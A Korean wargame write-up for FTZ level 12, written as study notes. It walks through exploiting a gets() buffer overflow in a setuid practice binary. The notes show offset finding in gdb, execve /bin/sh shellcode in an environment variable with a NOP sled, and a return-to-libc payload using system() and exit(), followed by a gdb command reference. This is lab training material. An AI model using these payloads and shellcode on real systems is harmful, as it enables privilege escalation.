# FTZ 12  
## 문제설명  
attackme 프로그램을 공격하자. attackme의 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
```
#include <stdoi.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	char str[256];

	setreuid( 3093, 3093);
	printf( "문장을 입력하세요.\n");
	gets(str);
	printf("%s\n", str);
}
```  

## 문제 풀이  
### 풀이과정-환경변수 이용  
1. ls -al을 해보자. attackme 프로그램에 level13 권한으로 setuid가 걸려있다. BOF 공격으로 attackme 파일에서 쉘을 열고 level13 권한으로 해당 레벨의 password를 알아내면 될 것 같다.  
2. hint 파일을 해석해보자.  
```
#include <stdoi.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
        char str[256];  # string 배열 256byte

        setreuid( 3093, 3093); # level13의 프로세스 ID, 이걸로 attackme의 uid가 level13이 되었다.
        printf( "문장을 입력하세요.\n");
        gets(str); # gets 함수로 사용자 입력을 str 변수에 담는다.
        printf("%s\n", str); # str 변수에 입력받은 내용 출력
}

```
3. 풀이는 다음과 같다.  
* str[256]의 시작점에서 main() ret까지의 거리를 구한다.  
* 환경변수에 쉘 코드를 등록하고 주소를 확인한다.  
* ret 위치의 데이터를 쉘 코드 주소로 변조시킬 페이로드를 작성한다.  
* 페이로드를 이용해 쉘 획득  

4. gdb를 이용해 main()과 ret 까지의 거리를 구해보자.  
그러기 위해 우선 ```cp attackme tmp/``` tmp에 attackme를 복사.   
모든 작업은 tmp에서 진행한다.  
```
gdb attackme
set disassembly-flavor intel // 우리에게 익숙한 intel 어셈블리로 바꾼다.
disas main // main을 디스어셈블한다.
```  
5. lea	eax, [ebp-264] : 이 부분을 통해 str 버퍼에서 ebp까지의 거리가 264라는 것을 알 수 있다.  
에 그렇지만 우리는 256byte의 배열을 선언했는걸?! => 나머지 8byte는 더미값!
그리고 ret 시작점은 264 + 4byte(ebp 크기) = 268byte 이다.  
즉, str[256] 시작점에서부터 main() ret까지 거리는 268byte

6. 환경변수에 등록할 쉘코드를 구글링(반드시 직접 짜보겠어...)을 통해 구하자.  
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```  

7. 쉘코드(25Byte, /bin/sh를 실행시키는 코드)를 환경변수에 등록하자.  
```
export SHELL=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
```  
> NOP Sled 기법을 이용하기 때문에 null(\90)은 충분히 많이 준다.  
> 환경변수는 OS가 필요한 정보를 메모리에 등록해놓고 필요할 때 마다 참조하는 영역을 의미한다. 일반 사용자 역시 환경 변수에 등록해서 사용이 가능하다.  
> 환경변수에 등록된 데이터는 고정적인 메모리 주소를 가지고 있게 된다. 그래서 우리가 필요한 쉘코드를 환경변수에 등록하고 이 환경 변수의 메모리 주소를 알아와서 ret에덮어씌우면, 환경변수에 등록한 쉘코드가 실행되어 변조가 가능하게 된다.  
>> export (환경변수명) = (사용자입력)  
>> 인터프리터를 실행하는 두 번째 방법: python -c command는 command에 있는 문장을 실행함. 셸의 -c 옵션에 해당. 파이썬 문장은 종종 셸에서 특별한 의미가 있는 공백이나 다른 문자들을 포함하기 때문에, command 전체를 작은따옴표로 감싸주는 것이 좋음.  

8. 환경변수에 등록된 쉘코드의 주소를 알아보기 위해 간단한 c언어 코드를 만들고 실행시키자.  
```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
	char *env;

	env=getenv("SHELL");
	printf("address = %p\n",env);

	return 0;
}
```  
```
gcc -o getenv getenv.c  
./getenv
```  
컴파일 후 실행시키면 쉘코드의 주소가 나온다.  

9. 이제 페이로드를 작성해보자.  
```
(python -c 'print "\x90"*268 + "[쉘코드의 주소를 리틀엔디안으로]";cat) | ./attackme

// 리틀엔디안 예시
쉘코드 주소 = 0xbffffef6
페이로드 안의 쉘코드 주소 = \xf6\xfe\xff\xbf
```  

* 작성 예시  
```
아래의 n에는 적절한 byte 수를 계산하여 넣는다. 그로인해 ret지점에 정확히 환경변수 주소가 덮이게 해야한다.
즉 n = str~ret 거리

// strcpy
./실행파일 `python –c ‘print “A”*n+”쉘코드 주소”’`

얘는 strcpy에서 argv[1]를 copy하는거니까 실행파일 먼저 실행할때 인자로 넘겨줘야하고

// gets
(python -c 'print"\x90"*n+"쉘코드 주소"'; cat) | ./실행파일

얘는 실행파일을 실행하고 입력해줘야하기 때문!!!
쉘이 안꺼지게 세미콜론으로 또 하나의 명령을 줌
```  
> 익스플로잇: 대상의 취약점으로 대상의 시스템에 침투하는 행위. 즉, 취약점을 악용하는 방법 그 자체  
ex. bof, sql injection, 설정오류 등  
> 페이로드 : 대상의 취약점으로 대상 시스템에 익스플로잇 한 뒤, 수행하는 악의적 행위. 즉, 시스템에 실행시키고자 하는 코드  
ex. 리버스쉘(윈도우 cmd로 대상 시스템에서 공격자에게 역으로 접속을 시도하는 페이로드), 바인드쉘(대상 시스템의 응답 포트에 cmd를 바인드해 공격자가 접속할 수 있도록 유도하는 페이로드)  
> 쉘코드: 공격을 수행할 때 페이로드로 사용되는 명령 집합. 쉘코드는 보통 어셈블리어로 작성하는데, 연속된 명령을 대상 시스템에서 실행한 후 명령 쉘을 얻는다.  

10. 페이로드를 실행시키니 쉘이 성공적으로 떨어진다. 그리고 my-pass 명령어를 통해 level13의 패스워드를 얻는다.  
11. 패스워드는 "have no clue"  

## RTL   
* RTL, Return To Libc: 리눅스에 존재하는 공유 라이브러리 개념을 이용한 기법이다. 즉 ret를 공유 라이브러리 함수의 주소로 적어 해당 함수를 실행시키는 방법이다.  
> 예를 들면, printf 함수를 사용할 때 printf를 포함한 내장 라이브러리인 libc가 libc 영역에 적재되게 된다. 이때 pritf 함수만 libc 영역에 적재되는 것이 아니라 모든 함수가 libc.so에 적재된다. 따라서 함수를 사용하지 않더라도 모든 함수가 포함되어 이 함수들을 자유롭게 사용할 수 있게 된다.  
> 이 원리를 이용해 RET에 내장 함수의 주소로 변경해 공격하는 기법을 RTL이라 한다.  
* 보통 RTL을 쓸 때 system()함수를 많이 쓴다. 왜냐하면 쉘을 실행시키는 함수이기 때문이다!  
* 그림으로 이해해보자.  
<img width="262" alt="1" src="https://user-images.githubusercontent.com/46364778/89105836-b0b73600-d45f-11ea-9a17-c0c0e323fb06.PNG">  

RET에 함수 주소가 들어오기 전(RTL 공격 전)의 스택이다.  
이제 함수를 RET에 불러오기 전에 일단 에필로그(leave와 ret)가 일어나야한다.  

leave는  
mov esp, ebp  
pop ebp  
스택에 쌓여있는 지역변수들과 그 외의 것들을 정리해주고,  
ebp에 sfp 즉, 이전 함수의 ebp를 다시 ebp에 pop연산 한다. (이전 스택프레임 복원)  

<img width="264" alt="2" src="https://user-images.githubusercontent.com/46364778/89105884-04c21a80-d460-11ea-876b-2e1be132ab01.PNG">  

그리고 난 후 ret은  
pop eip  
jmp eip  
현재 eip 다음에 실행될 명령어 주소를 eip 레지스터에 저장하고 eip주소로 점프한다.  

그 뒤 라이브러리에 있는 함수 주소를 ret에 넣는다.  
CALL 명령으로 함수를 호출하는 것이 아니고 RET을 변조하여 함수를 호출하는 것이다.  
이 경우, 정상적으로 함수가 종료되어 라이브러리의 exit()을 통하여 종료되는 것이 아니고 값이 변조되어 그대로 함수가 불러지므로  
RET 자리에 호출된 함수의 SFP가 쌓이고,  
그 위(ebp+4)로 호출된 함수의 RET이,  
또 그 위로(ebp+8)에 함수의 인자가 쌓인다.  
(그림에서는 해당 함수를 printf로 한다.)  

<img width="277" alt="3" src="https://user-images.githubusercontent.com/46364778/89105934-684c4800-d460-11ea-8908-ce2c538e555e.PNG">  

RTL은 ret 자리에 라이브러리 함수를 넣어 변조시키는 공격이라고 했다.  
그럼 우리가 필요한 것은 **함수의 주소, 함수의 인자**이다!  
이번에 system()을 사용한다고 했으니,  
system 함수에 인자에 "/bin/sh"로 넣어줘야 할 것이다.  


* 스택의 구조에서 system() 함수를 ret에 덮어씀으로 인해 프로세스가 종료되고 리턴할 때 system()함수로 가게 된다.  
* 그리고 system()함수가 끝나게 되면 그 다음 4byte가 리턴주소이기 때문에 정상적으로 종료될 수 있게 하기 위하여 exit()를 붙여준다. 즉 system()의 리턴주소에 exit()를 넣은 것.(그냥 dummy값을 넣어도 된다. 일단 쉘을 따고 나면 그 후에 segment fault가 뜨든 상관없으니까..ㅎㅎ 물론 이를 이용해 RTL chaining 기법도 있다.)  
* system()은 쉘을 실행할 수있고 인자로 /bin/sh를 넣어주면 된다. 

* 우선 공격하기 전에 ret 명령으로 실행하는 함수와 함수의 인자 사용에 대해 알아보자.  
ret 명령은 현재 esp가 가리키는 곳에서 값을 꺼내 eip로 설정하는데 ret에 함수의 주소가 있다면 함수를 실행하게 된다.  
* 그럼 call 명령어에 의한 함수 호출과 ret 명령어에 의한 함수 호출의 차이는 무엇일까?  
* call의 경우 ret를 스택에 저장하고 함수를 호출한다. 호출한 함수가 끝나고 함수 내에서 ret을 실행하면 esp+4한 부분부터 실행 흐름을 계속하게 된다.  

* 그럼 공격을 해보자. 페이로드는 다음과 같다.  
> dummy(268) + system() 주소(4) + exit() 주소(4) + /bin/sh가 있는 주소(4)  

### 풀이과정-RTL  
1. 각 함수의 주소들을 알아보자.  
```
gdb -q attackme
(gdb) b main           // Breakpoint 1 at 0x8048399
(gdb) r                // Starting program: /home/level12/tmp/attackme
                       // Breakpoint 1, 0x8048399 in main()
(gdb) p system	       // $1 = {<text variable, no debug info>} 0x4203f2c0 <system>
(gdb) p exit	       // $2 = {<text varibale, no debug info>} 0x42029bb0 <exit>
(gdb) q                //quit
```  

2. 이제 /bin/sh의 주소를 알아보기 위해 tmp에 다음과 같이 소스코드 파일을 만든다.  
다행히도 system() 함수 내부에 "/bin/sh"라는 문자열이 존재하기 때문에 아래와 같이 "/bin/sh" 문자열의 주소를 구한다.  
```
#include <stdio.h>

int main(int argc, char **argv)
{
	long shell;
	shell = 0x4203f2c0; //system()
	while(memcmp((void*)shell, "/bin/sh", 8)) shell++;
	printf("\"/bin/sh\" is at [ %#x ]\n", shell);
}
```  
- memcmp
> int memcmp(const void* ptr1, const void* ptr2, size_t num);  
> ptr1 비교할 첫번째 주소, ptr2 비교할 두번째 주소, num 비교할 크기  
> ptr1이 가리키는 처음 num 바이트의 데이터와  
> ptr2가 가리키는 처음 num 바이트의 데이터를 비교하여  
> 이들이 같다면 0을 리턴하고, ptr1이 크면 1, ptr2가 크면 -1 리턴한다.  
shell 포인터가 이동하면서 비교하는 듯 하다!  

3. 위 소스코드를 실행시키면 system() 함수 상에서 "/bin/sh"이 어디에 있는지 나온다.  

4. 해당 주소를 가지고 공격페이로드를 작성하면 된다.  
```
dummy(268) + system() 주소(4) + exit() 주소(4) + /bin/sh가 있는 주소(4) 

(python -c 'print "\x90"x268 + "[system()주소 리틀엔디안]" + "[exit()주소 리틀엔디안]"+ ["/bin/sh"가 있는 주소 리틀엔디안]'; cat) | ./attackme
```

## 그 외  
* RTL Chaining  
* cat을 붙이는 이유  
pipe(|) 사용 시 왼쪽 프로그램의 stdout이 오른쪽 프로그램의 stdin으로 들어가게 되는데  
python이 실행되고 종료되면서 pipe broken 오류로 인하여 종료가 일어난다.  
따라서 사용자의 입력을 출력해주는 cat이나 tee를 이용하여 stdin을 유지시켜야 한다.  
![4](https://user-images.githubusercontent.com/46364778/89106266-7059b700-d463-11ea-96e7-c52eeaa0f409.png)  

* BackDoor 생성(*아직이해못함*)  
쉘을 얻은 후에 추가적으로 입력을 해주면 아래와 같이 Backdoor를 생성할 수 있다.  
<img width="461" alt="5" src="https://user-images.githubusercontent.com/46364778/89106394-7734f980-d464-11ea-98b6-c44829d6ed9f.png">  

## 참고자료  
### gdb 명령어 모음
**1. 시작과 종료**  
* gdb [프로그램명] : 시작  
* q(quit) or ctrl+d : 종료  

**2. 소스보기(list)**  
**3. 브레이크 포인트**  
* b func : func 함수의 시작부분에 브레이크 포인트 설정  
* b 10 : 10행에 브레이크 포인트 설정  
* b *0x8049000 : 특정 주소에 브레이크 포인트 설정  
* tb : b와 같으나 1회용 브레이크 포인트. 문법은 b와 동일  
* info b : 현재 브레이크 포인트 보기  
* cl : 브레이크 포인트 지우기  
* d : 모든 브레이크 포인트 지우기  

**4. 진행 명령어**  
* r(run) : 프로그램 수행  
* k(kill) : 프로그램 수행 종료  
* s(step) : 현재 행 수행 후 정지, 함수 호출시 함수 안으로 들어감  
* s 5 : s 다섯번 수행  
* n(next) : 현재 행 수행 후 정지, 함수 호출시 함수 수행 다음 행으로 감  
* n 5 : n 다섯번 수행  
* c(continue) : 다음 브레이크 포인트까지 진행  
* u : 현재 루프를 빠져나감  
* finish : 현재 함수를 수행하고 빠져 나감  
* return : 현재 함수를 수행하지 않고 빠져 나감  
* return : 위와 같으나 리턴값 지정  

**5. 와치 포인트**  
* watch [변수명] : 특정변수에 와치 포인트를 설정하고, 특정변수가 바뀔 때마다 브레이크가 걸리면서 이전/현재 값을 출력한다.  

**6. 변수출력 관련**  
* info locals : 현재 스택의 로컬변수 모두를 출력  
* info variables : 전역변수 모두 출력 (스압)  
* p [변수명] : 해당변수 value 출력  
포인터변수 입력시 주소값 출력, *포인터변수명 -> 실제 value 출력  
* p $[레지스터명] : 레지스터값 출력  
* p *[포인터] : struct/class의 배열일 때 배열의 크기를 알림  
* p /[출력형식][변수명] : 출력형식에 맞추어 변수값 출력  
- p [함수] : 해당 함수으 주소를 출력
* t : 2진수  
* o : 8진수  
* d : 부호없는 10진수  
* u : 부호없는 10진수  
* x : 16진수  
* c : 최초 1바이트 값을 문자형으로 출력  
* f : 부동소수점  
* a : 가장 가까운 심볼의 오프셋 출력  
* p (캐스팅)[변수명] : 변수를 캐스팅하여 출력 ( p (char*)ptr )  
- p [포인터변수or배열]+[숫자] : 특정 주소 + 숫자 위치 출력 ( p (array[1]+4) )  
- p [변수명] = [value] : 특정 변수의 값을 설정  
- info registers : 레지스터 전체 출력  
- display [변수명] : 매번 p 치기 귀찮으니 특정변수 진행 중 계속 출력  
- p와 동일한 방식으로 출력형식 지정가능  
- disalbe display [번호] : 일시적으로 디스플레이 중단  
- enable display [번호] : 중단했던 번호 다시 출력  
- undisplay [번호] : 출력하던 display 변수 제거  

**7. 스택 상태 검사**  
- info f : 스택 프레임 내용 출력  
- info args : 함수 호출시 인자를 출력  
- info locals : 함수의 지역변수를 출력  
- info catch : 함수의 예외 핸들러를 출력  
- bt : 전체 스택 프레임 출력(콜스택)  
- frame [스택번호] : 스택번호의 스택 프레임으로 이동  
- up : 상위 스택 프레임으로 이동  
- up [숫자] : 숫자만큼 상위 스택프레임으로 이동  
- down : 하위 스택 프레임으로 이동  
- down [숫자] : 숫자만큼 하위 스택프레임으로 이동  

**8. 메모리 상태 검사**  
- x/[범위][출력형식][범위의단위] [메모리주소나 함수명]  
- 범위 : 기본 4바이트 단위  

**9. 출력 형식**  
- t : 2진수  
- o : 8진수  
- d : 부호없는 10진수  
- u : 부호없는 10진수  
- x : 16진수  
- c : 최초 1바이트 값을 문자형으로 출력  
- f : 부동소수점  
- a : 가장 가까운 심볼의 오프셋 출력  
- s: 문자열로 출력  
- i : 어셈블리 형식으로 출력  

**10. 범위의 단위**  
- b : 1 byte  
- h : 2 byte  
- w : 4 byte  
- g : 8 byte  
- ex) x/10 main : main 함수로부터 40 byte 출력  

**11. 기타**  
- disas [함수명] : 특정함수의 어셈블리 코드 출력  
- disas [주소] [주소] : 주소 사이의 어셈블리 코드 출력  
- call [함수명(인자)] : 특정 함수를 인자값으로 호출  
- jump *[주소] : 주소로 강제적으로 분기  
- jump [행번호] : 특정 행으로 강제 분기  
- jump [함수명] : 특정 함수로 강제 분기  
- info signals : signal 종류 출력  
- info tab키 : info로 확인 가능한 명령어 출력  
- set {타입}[주소] = [값] : 특정 메모리에 값을 지정 ( set {int}0x8048300 = 100 )  

**12. 환경 설정**  
- info set : 설정 가능한 내용 출력  

**13. 역어셈블 관련**  
**1) 역어셈블 표시**  
- gdb$ disas (함수명) or gdb$ disas (함수 내의 시작 주소) (함수 내의 종료 주소)  
- 함수에 포함되지 않는 영역을 역어셈블 하는 경우  
gdb$ x/ (명령 수) i (선두 주소)  
=> 앞쪽의 주소에서 지정된 명령어만큼 역어셈블  

**14. 브레이크 포인트**  
**1) 브레이크 포인트 설정**  
- gdb$ b (함수 이름) or gdb$ b (주소)  

**2) 브레이크 포인트 상태 표시**  
- 브레이크 포인트가 어디에 설정되어 있는지 등의 상태를 확인  
- gdb$ i b (info break)  

**3) 브레이크 포인트 삭제,비활성화,활성화**  
- 브레이크 포인트 삭제 : gdb$ d (브레이크 포인트 번호)  
- 브레이크 포인트 비활성화 : gdb$ disable (브레이크 포인트 번호)  
- 브레이크 포인트 활성화 : gdb$ enable (브레이크 포인트 번호)  
- 일정 횟수만큼 브레이크 포인트를 통과하게끔 비활성화 : gdb$ ignore (브레이크 포인트 번호) ( 비활성화 할 횟수)  
